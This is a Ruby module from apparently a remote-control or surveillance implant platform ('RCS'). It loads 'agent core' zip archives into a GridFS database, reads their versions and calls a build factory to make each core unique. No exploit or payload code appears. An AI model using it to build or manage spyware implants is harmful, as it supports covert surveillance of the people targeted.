#
#  Cores handling module
#
require_relative 'db_layer'
require_relative 'grid'

# from RCS::Common
require 'rcs-common/trace'
require 'fileutils'

module RCS
module DB

class Core
  extend RCS::Tracer

  def self.empty_temp_folder
    path = File.expand_path(Config.instance.temp)
    FileUtils.rm_rf(path)
    FileUtils.mkdir(path)
  end

  def self.load_all
    trace :info, "Loading cores into db..."

    Dir['./cores/*'].each do |core_file|
      begin
        load_core core_file
      rescue Exception => e
        trace :error, "Cannot load core #{name}: #{e.message}"
      end
    end
  end

  def self.load_core(core_file)
    empty_temp_folder

    name = File.basename(core_file, '.zip')
    version = ''

    # Copy the core file (a zip archive) to the temp folder
    temp_core_file = Config.instance.temp(File.basename(core_file))
    FileUtils.cp(core_file, temp_core_file)

    # Make unique and load the core file
    Zip::File.open(temp_core_file) do |z|
      version = z.file.open('version', "rb") { |f| f.read }.chomp
    end

    make_unique(temp_core_file)

    trace :info, "Load core: #{name} #{version}"

    # delete if already present
    ::Core.where({name: name}).destroy_all

    # replace the new one
    core = ::Core.new
    core.name = name
    core.version = version

    core[:_grid] = GridFS.put(File.open(temp_core_file, 'rb+') {|f| f.read}, {filename: name})
    core[:_grid_size] = File.size(temp_core_file)
    core.save

    # Remove the original core file
    File.delete(core_file)
  ensure
    empty_temp_folder
  end

  def self.make_unique(file, platform = nil)

    name = File.basename(file, '.*')

    # process only the real agent cores
    return if ['anon', 'applet', 'offline', 'qrcode', 'u3', 'upgrade', 'wap'].include? name

    core = Build.factory(platform || name.to_sym)
    core.unique(file)
    core.clean
  end

end #Core

end #DB::
end #RCS::